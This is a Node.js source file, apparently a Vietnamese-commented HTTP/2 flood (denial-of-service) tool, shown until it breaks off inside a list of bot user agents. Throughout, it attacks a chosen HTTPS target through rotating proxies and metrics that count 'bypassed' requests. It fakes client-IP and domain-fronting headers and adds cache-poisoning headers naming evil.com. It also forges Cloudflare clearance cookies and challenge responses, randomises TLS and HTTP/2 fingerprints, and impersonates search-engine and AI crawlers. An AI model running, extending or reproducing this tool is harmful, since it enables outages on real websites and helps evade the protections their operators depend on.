const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length;

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        cleanup();
        return 1;
    })
    .on("SIGTERM", cleanup)
    .on("SIGINT", cleanup);

// ================ CẤU TRÚC MỚI ================
class AttackMetrics {
    constructor() {
        this.totalRequests = 0;
        this.successfulRequests = 0;
        this.blockedRequests = 0;
        this.bypassedRequests = 0;
        this.responseTimes = [];
        this.statusCodes = {};
        this.startTime = Date.now();
    }

    logRequest(status) {
        this.totalRequests++;
        
        if (status >= 200 && status < 400) {
            this.successfulRequests++;
            if (status === 200) this.bypassedRequests++;
        } else if (status >= 400 && status < 600) {
            this.blockedRequests++;
        }
        
        if (!this.statusCodes[status]) {
            this.statusCodes[status] = 0;
        }
        this.statusCodes[status]++;
    }

    getStats() {
        const uptime = Date.now() - this.startTime;
        return {
            total: this.totalRequests,
            success: this.successfulRequests,
            blocked: this.blockedRequests,
            bypassed: this.bypassedRequests,
            successRate: this.totalRequests > 0 ? (this.successfulRequests / this.totalRequests * 100).toFixed(2) : 0,
            bypassRate: this.totalRequests > 0 ? (this.bypassedRequests / this.totalRequests * 100).toFixed(2) : 0,
            rps: uptime > 0 ? (this.totalRequests / (uptime / 1000)).toFixed(2) : 0,
            statusCodes: this.statusCodes,
            uptime: Math.floor(uptime / 1000)
        };
    }
}

class ProxyManager {
    constructor(proxyList, useAuth = false) {
        this.proxies = proxyList;
        this.useAuth = useAuth;
        this.currentIndex = 0;
        this.badProxies = new Set();
        this.proxyStats = new Map();
        this.lastCleanup = Date.now();
    }

    getNextProxy() {
        // Clean bad proxies mỗi 30 giây
        if (Date.now() - this.lastCleanup > 30000) {
            this.badProxies.clear();
            this.lastCleanup = Date.now();
        }

        // Tìm proxy tốt
        let attempts = 0;
        while (attempts < this.proxies.length) {
            this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
            const proxy = this.proxies[this.currentIndex];
            
            if (!this.badProxies.has(proxy)) {
                return proxy;
            }
            attempts++;
        }

        // Nếu không tìm thấy proxy tốt, reset danh sách
        this.badProxies.clear();
        return this.proxies[this.currentIndex];
    }

    markBad(proxy) {
        this.badProxies.add(proxy);
    }

    markGood(proxy) {
        if (!this.proxyStats.has(proxy)) {
            this.proxyStats.set(proxy, { success: 0, fail: 0 });
        }
        const stats = this.proxyStats.get(proxy);
        stats.success++;
    }
}

// ================ GLOBAL VARIABLES ================
const metrics = new AttackMetrics();
let proxyManager;
let activeConnections = new Set();

const statusesQ = [];
let statuses = {};
let proxyConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const authProxyFlag = process.argv.includes('--auth');
const multiTargetIndex = process.argv.indexOf('--targets');
const multiTargetFile = multiTargetIndex !== -1 && multiTargetIndex + 1 < process.argv.length ? process.argv[multiTargetIndex + 1] : null;
const configIndex = process.argv.indexOf('--config');
const configFile = configIndex !== -1 && configIndex + 1 < process.argv.length ? process.argv[configIndex + 1] : null;

// ================ LOAD CONFIG FILE ================
let config = {};
if (configFile && fs.existsSync(configFile)) {
    try {
        config = JSON.parse(fs.readFileSync(configFile, 'utf8'));
        console.log(chalk.green('✓ Loaded configuration from'), configFile);
    } catch (e) {
        console.log(chalk.red('✗ Failed to load config file:'), e.message);
    }
}

// ================ LOAD MULTI TARGETS ================
let targets = [];
let currentTargetIndex = 0;
if (multiTargetFile && fs.existsSync(multiTargetFile)) {
    targets = fs.readFileSync(multiTargetFile, 'utf8')
        .split('\n')
        .filter(line => line.trim() && line.startsWith('https://'))
        .map(line => new URL(line.trim()));
    
    if (targets.length > 0) {
        console.log(chalk.green(`✓ Loaded ${targets.length} targets from`), multiTargetFile);
    }
}

// ================ VALIDATION ================
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(chalk.red(`
     Usage Error: Missing required parameters
     Usage: node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
    `));
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error(chalk.red('✗ Protocol only supports https://'));
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error(chalk.red('✗ Proxy file does not exist'));
    process.exit(1);
}

// ================ INIT PROXY MANAGER ================
const proxyData = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const parts = line.split(':');
    if (authProxyFlag) {
        return parts.length === 4 && !isNaN(parts[1]);
    } else {
        return parts.length === 2 && !isNaN(parts[1]);
    }
});

if (proxyData.length === 0) {
    console.error(chalk.red('✗ No valid proxy found'));
    process.exit(1);
}

proxyManager = new ProxyManager(proxyData, authProxyFlag);

// ================ HELPER FUNCTIONS ================
function getRandomChar() {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
}

let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);

let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

const baseUrl = new URL(target);
let currentUrl = new URL(target);

// ================ HTTP/2 FUNCTIONS ================
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (currentUrl.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    currentUrl.pathname = currentUrl.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ================ IP GENERATION ================
const legitIP = generateLegitIP();

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." },
        { asn: "AS7643", country: "VN", ip: "123.30.134." },
        { asn: "AS18403", country: "VN", ip: "14.160.0." },
        { asn: "AS24086", country: "VN", ip: "42.112.0." },
        { asn: "AS38733", country: "VN", ip: "103.2.224." },
        { asn: "AS45543", country: "VN", ip: "113.22.0." },
        { asn: "AS7602", country: "VN", ip: "27.68.128." },
        { asn: "AS131127", country: "VN", ip: "103.17.88." },
        { asn: "AS140741", country: "VN", ip: "103.167.198." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

// ================ DOMAIN FRONTING ================
function setupDomainFronting() {
    const frontDomains = [
        'cdn.cloudflare.net',
        'static.akamai.net',
        'images-amazon.com',
        's3.amazonaws.com',
        'googleapis.com'
    ];
    return frontDomains[Math.floor(Math.random() * frontDomains.length)];
}

// ================ HEADER GENERATORS ================
function generateAlternativeIPHeaders() {
    const headers = {};
    const frontDomain = setupDomainFronting();
    
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["host"] = frontDomain; // Domain fronting
    if (Math.random() < 0.3) headers["x-forwarded-host"] = frontDomain;
    
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }
    
    return headers;
}

// ================ CACHE POISONING ================
function generateCachePoisoningHeaders() {
    const techniques = [
        {
            'X-Forwarded-Host': 'evil.com',
            'X-Original-URL': '/bypass',
            'X-Rewrite-URL': '/'
        },
        {
            'X-Forwarded-Server': randstr(8) + '.com',
            'X-Forwarded-Proto': 'https',
            'X-Real-IP': generateLegitIP()
        },
        {
            'CF-Connecting-IP': generateLegitIP(),
            'CF-IPCountry': 'US',
            'CF-Ray': randstr(8) + '-' + randstr(3)
        }
    ];
    
    return techniques[Math.floor(Math.random() * techniques.length)];
}

// ================ ORIGIN OVERRIDE ================
function addOriginOverride() {
    const origins = [
        'https://www.cloudflare.com',
        'https://origin.target.com',
        'https://localhost',
        'https://127.0.0.1',
        'https://' + randstr(10) + '.com'
    ];
    return origins[Math.floor(Math.random() * origins.length)];
}

// ================ DYNAMIC HEADERS ================
function generateDynamicHeaders() {
    const secChUaFullVersion = `${getRandomInt(120, 133)}.0.${getRandomInt(4000, 6000)}.${getRandomInt(0, 100)}`;
    const platforms = ['Windows', 'macOS', 'Linux'];
    const architectures = ['x86', 'arm', 'arm64'];
    const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
    const headerOrder = [
        'user-agent',
        'accept',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-full-version',
        'accept-language',
        'accept-encoding',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'upgrade-insecure-requests'
    ];

    const dynamicHeaders = {
        'user-agent': fingerprint.navigator.userAgent,
        'accept': Math.random() > 0.5 
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,*/*;q=0.9',
        'sec-ch-ua': fingerprint.navigator.sextoy,
        'sec-ch-ua-mobile': Math.random() > 0.5 ? '?1' : '?0',
        'sec-ch-ua-platform': `"${platforms[Math.floor(Math.random() * platforms.length)]}"`,
        'sec-ch-ua-arch': `"${architectures[Math.floor(Math.random() * architectures.length)]}"`,
        'sec-ch-ua-bitness': Math.random() > 0.5 ? '"64"' : '"32"',
        'sec-ch-viewport-width': getRandomInt(800, 2560).toString(),
        'sec-ch-device-memory': [4, 8, 16][Math.floor(Math.random() * 3)].toString(),
        'accept-language': fingerprint.navigator.language,
        'accept-encoding': 'gzip, deflate, br',
        'sec-fetch-site': ['same-origin', 'cross-site'][Math.floor(Math.random() * 2)],
        'sec-fetch-mode': ['navigate', 'cors'][Math.floor(Math.random() * 2)],
        'sec-fetch-dest': ['document', 'script'][Math.floor(Math.random() * 2)],
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    };

    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key])
        .map(key => [key, dynamicHeaders[key]])
        .concat(Object.entries(generateAlternativeIPHeaders()))
        .concat(Object.entries(generateCachePoisoningHeaders()));

    // Thêm origin override
    if (Math.random() < 0.3) {
        orderedHeaders.push(['origin', addOriginOverride()]);
    }

    return orderedHeaders;
}

// ================ CLOUDFLARE BYPASS ================
function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}`)
        .digest('hex')
        .substring(0, 16);
    
    const cookieParts = [
        `${clientId}`,
        `${challengeId}-${version}`,
        `${timestamp}`,
        hashPart
    ];
    
    return `cf_clearance=${cookieParts.join('.')}`;
}

function generateChallengeHeaders() {
    const challengeToken = randstr(32);
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${fingerprint.canvas}${timestamp}`)
        .digest('hex');
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 16)]
    ];
}

// ================ AUTHORIZATION ================
function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ 
                sub: randstr(8), 
                iat: Math.floor(Date.now() / 1000),
                exp: Math.floor(Date.now() / 1000) + 3600,
                jti: crypto.randomBytes(16).toString('hex')
            })).toString('base64url');
            const signature = crypto.createHmac('sha256', randstr(32)).update(`${header}.${payload}`).digest('base64url');
            return `Bearer ${header}.${payload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(32))}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username.replace('%RAND%', randstr(8))}:${password.replace('%RAND%', randstr(12))}`).toString('base64');
        return `Basic ${credentials}`;
    } else if (type.toLowerCase() === 'custom') {
        return value.replace('%RAND%', randstr(24));
    } else if (type.toLowerCase() === 'aws') {
        const awsKey = value.split(':')[0] || randstr(20);
        const awsSecret = value.split(':')[1] || randstr(40);
        const awsRegion = value.split(':')[2] || 'us-east-1';
        const awsService = value.split(':')[3] || 'execute-api';
        const amzDate = new Date().toISOString().replace(/[:\-]|\.\d{3}/g, '');
        
        return `AWS4-HMAC-SHA256 Credential=${awsKey}/${amzDate.substring(0,8)}/${awsRegion}/${awsService}/aws4_request, SignedHeaders=host;x-amz-date, Signature=${randstr(64)}`;
    }
    return null;
}

// ================ METHODS ================
function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'CONNECT', 'TRACE'];
    return methods[Math.floor(Math.random() * methods.length)];
}

// ================ CACHE BYPASS ================
const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];

// ================ JA4 FINGERPRINT ================
function generateJA4Fingerprint() {
    const tlsVersions = ['t13', 't12'];
    const greaseValues = ['da', 'ea', 'fa'];
    const extensionOrders = [
        '0000-001b-0010-002b-000d-0023-0005-000a',
        '0000-001b-002b-0010-000d-0023-000a-0005'
    ];
    
    const selectedGrease = greaseValues[Math.floor(Math.random() * greaseValues.length)];
    const ja4 = `${tlsVersions[Math.floor(Math.random() * tlsVersions.length)]}${selectedGrease}1516h2_${crypto.randomBytes(6).toString('hex')}_${crypto.randomBytes(6).toString('hex')}`;
    
    return {
        raw: ja4,
        simplified: ja4.substring(0, 16)
    };
}

// ================ FINGERPRINT GENERATORS ================
function generateJA3Fingerprint() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
    ];

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    const curves = [
        'X25519',
        'secp256r1',
        'secp384r1'
    ];

    const extensions = [
        '0',
        '5',
        '10',
        '13',
        '16',
        '18',
        '21',
        '23',
        '27',
        '35',
        '43',
        '45',
        '51',
        '65281',
        '17513'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);

    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves,
        extensions: shuffledExtensions,
        padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
}

function randomizeHTTP2Fingerprint() {
    const fingerprints = [
        { 
            SETTINGS: [
                [1, 65536],  // HEADER_TABLE_SIZE
                [2, 0],      // ENABLE_PUSH
                [3, 1000],   // MAX_CONCURRENT_STREAMS
                [4, 6291456], // INITIAL_WINDOW_SIZE
                [5, 16384],  // MAX_FRAME_SIZE
                [6, 32768],  // MAX_HEADER_LIST_SIZE
                [8, 1]       // ENABLE_CONNECT_PROTOCOL
            ],
            WINDOW_UPDATE: 15663105,
            PRIORITY: true
        },
        {
            SETTINGS: [
                [1, 4096],
                [2, 1],
                [3, 100],
                [4, 65535],
                [5, 32768],
                [6, 8192],
                [8, 0]
            ],
            WINDOW_UPDATE: 16777215,
            PRIORITY: false
        },
        {
            SETTINGS: [
                [1, 16384],
                [2, 0],
                [3, 500],
                [4, 131072],
                [5, 65536],
                [6, 16384],
                [8, 1]
            ],
            WINDOW_UPDATE: 12582912,
            PRIORITY: true
        }
    ];
    
    return fingerprints[Math.floor(Math.random() * fingerprints.length)];
}

function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384, 65536],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [100, 500, 1000, 2000],
        INITIAL_WINDOW_SIZE: [65535, 131072, 262144, 6291456],
        MAX_FRAME_SIZE: [16384, 32768, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 16384, 32768, 65536],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };
    
    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }
    
    return http2Settings;
}

// ================ BROWSER FINGERPRINT ================
const ja3Fingerprint = generateJA3Fingerprint();
const ja4Fingerprint = generateJA4Fingerprint();
let currentHTTP2Fingerprint = randomizeHTTP2Fingerprint();

function generateBrowserFingerprint() {
    const screenSizes = [
        { width: 1366, height: 768 },
        { width: 1920, height: 1080 },
        { width: 2560, height: 1440 },
        { width: 414, height: 896 },
        { width: 360, height: 640 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "es-ES,es;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8"
    ];

    const webGLVendors = [
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 620, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 580, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Apple Inc.", renderer: "Apple GPU" }
    ];

    const tlsVersions = ['771', '772', '773'];
    const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];
    let rdversion = getRandomInt(126, 133);
    
    const botUserAgents = [
        'TelegramBot (like TwitterBot)',
        'GPTBot/1.0 (+https://openai.com/gptbot)',
        'GPTBot/1.1 (+https://openai.com/gptbot)',
        'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
        'ChatGPT-User/1.0 (+https://openai.com/bot)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)', 
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Twitterbot/1.0',
        'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
        'Slackbot',
        'Discordbot/2.0 (+https://discordapp.com)',
        'DiscordBot (private use)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
        'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
        'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
        'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)',
